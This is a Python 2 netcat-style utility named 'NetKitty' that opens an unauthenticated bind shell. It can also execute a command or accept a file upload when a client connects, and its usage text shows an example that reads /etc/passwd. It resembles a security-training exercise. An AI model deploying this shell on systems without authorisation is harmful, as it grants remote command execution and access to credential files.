import sys
import socket
import getopt
import threading
import subprocess

# define some global variable

listen = False
command = False
upload = False
execute = ""
target = ""
upload_dest = ""
port = 0

def usage():
    print ("NetKitty")
    print
    print "Usage : netkitty.py -t target_host -p port"
    print "-l --listen                       -listen on [host]:[port] for incoming conncetion"
    print "-e --execute=file_to_run          - execute the given file upon recv connection"
    print "-c --command                      -init a command shell"
    print "-u --upload=destination           - upon recv coon upload a file and write a dest"
    print
    print
    print "Examples:"
    print "netkitty.py -t 192.168.0.1 -p 4444 -l -c"
    print "nettkitty.py -t 192.168.0.1 -p 4444 -l -u=c:\\target.exe"
    print "netkitty.py -t 192.168.0.1 -p 4444 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./netkitty.py -t 192.168.11.12 -p 135"
    sys.exit(0)


def client_sender(buffer):

    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


    try:

        # connect to our target host
        client.connect((target,port))

        if len(buffer):
            client.send(buffer)
        while True:

            #backing the data

            recv_len = 1
            response = ""


            while recv_len:

                data = client.recv(4096)
                recv_len = len(data)
                response+= data

                if recv_len < 4096:
                    break
            print response,

            buffer = raw_input("")
            buffer += "\n"

            client.send(buffer)

    except:


        print "+>> Exeption Exiting ....."


        client.close()



def Server_loop():
    global target

    # we listen to all target when no target
    if not len(target):
        target = "0.0.0.0"


    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))



    server.listen(5)

    while True:

        client_socket, addr = server.accept()



        client_thread  = threading.Thread(target= client_handler , args=(client_socket, ))
        client_thread.start()




def run_command(command):
    command = command.rstrip()


    try:

        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)

    except:
        output = "Failed to execute the command. \r\n"


    # send the output back to client


    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_dest):
        file_buffer = ""




        while True:
            data = client_socket.recv(1024)


            if not data:
                break
            else:
                file_buffer += data


        try:

            file_descriptor = open(upload_dest,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()




            client_socket.send("Successfully saved file to %s \r\n" % upload_dest)
        except:

            client_socket.send("Failed tp save file to %s\r\n" % upload_dest)


    if len(execute):

        output = run_command(execute)

        client_socket.send(output)


    # another loop if comdshell is requested


    if command:

        while True:

            client_socket.send("[NetKitty]#-+>>  ")
            cmd_buffer = ""

            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)


            response = run_command(cmd_buffer)

            client_socket.send(response)









def main():
    global listen
    global port
    global execute
    global command
    global upload_dest
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the comdline option

    try:

        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ["help","listen","execute","target","port","command","upload"])

    except getopt.GetoptError as err:

        print str(err)
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c","--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_dest = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option please try again"


     # listen or send the data

    if not listen and len(target) and port > 0:


        # read the buf from cmdshell
        # Ctrl-D for not sending input
        # to stdin

        buffer = sys.stdin.read()

        # send data

        client_sender(buffer)
    # listen potentially and upload things excute and etc
    if listen:
        Server_loop()

main()



